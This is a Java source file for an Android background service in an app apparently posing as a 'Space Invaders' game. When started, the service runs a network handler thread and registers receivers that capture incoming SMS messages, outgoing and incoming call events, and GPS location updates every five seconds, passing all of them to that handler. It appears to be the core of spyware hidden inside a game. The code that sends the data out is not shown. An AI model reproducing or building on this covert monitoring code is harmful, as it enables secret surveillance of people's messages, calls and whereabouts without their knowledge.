package com.cst.spaceinvaders.service;

import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.location.LocationManager;
import android.os.IBinder;
import android.telephony.PhoneStateListener;
import android.telephony.TelephonyManager;
import com.cst.spaceinvaders.service.listener.GeolocationListener;
import com.cst.spaceinvaders.service.listener.IncomingCallListener;
import com.cst.spaceinvaders.service.network.Handler;
import com.cst.spaceinvaders.service.receivers.IncomingSMSReceiver;
import com.cst.spaceinvaders.service.receivers.OutgoingCallReceiver;

public class SpaceInvadersService extends Service
{
    private boolean m_started;
    private Handler m_handler;
    private Thread m_handlerThread;

    private IncomingSMSReceiver m_incomingSmsReceiver;
    private IncomingCallListener m_incomingCallListener;
    private OutgoingCallReceiver m_outgoingCallReceiver;
    private GeolocationListener m_geolocationListener;

    public SpaceInvadersService()
    {
        m_started = false;
        m_handler = new Handler(this);
        m_handlerThread = new Thread(m_handler);
    }

    @Override
    public void onCreate()
    {
        super.onCreate();
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId)
    {
        // DEBUG: Force restart service on recompile
        if (!m_started)
        {
            m_started = true;
            m_handlerThread.start();
            registerReceivers();
        }

        return super.onStartCommand(intent, flags, startId);
    }

    @Override
    public void onDestroy()
    {
        unregisterReceivers();
    }


    @Override
    public IBinder onBind(Intent intent)
    {
        return null;
    }

    private void registerReceivers()
    {
        m_incomingSmsReceiver = new IncomingSMSReceiver(m_handler);
        m_incomingCallListener = new IncomingCallListener(m_handler);
        m_outgoingCallReceiver = new OutgoingCallReceiver(m_handler);
        m_geolocationListener = new GeolocationListener(m_handler);

        registerReceiver(m_incomingSmsReceiver, new IntentFilter("android.provider.Telephony.SMS_RECEIVED"));
        registerReceiver(m_outgoingCallReceiver, new IntentFilter(Intent.ACTION_NEW_OUTGOING_CALL));
        ((TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE)).listen(m_incomingCallListener,
                PhoneStateListener.LISTEN_CALL_STATE);
        ((LocationManager) getSystemService(Context.LOCATION_SERVICE)).requestLocationUpdates(LocationManager.GPS_PROVIDER,
                5000, 1, m_geolocationListener);

    }

    private void unregisterReceivers()
    {
        unregisterReceiver(m_incomingSmsReceiver);
        unregisterReceiver(m_outgoingCallReceiver);
        ((TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE)).listen(m_incomingCallListener,
                PhoneStateListener.LISTEN_NONE);
    }

}
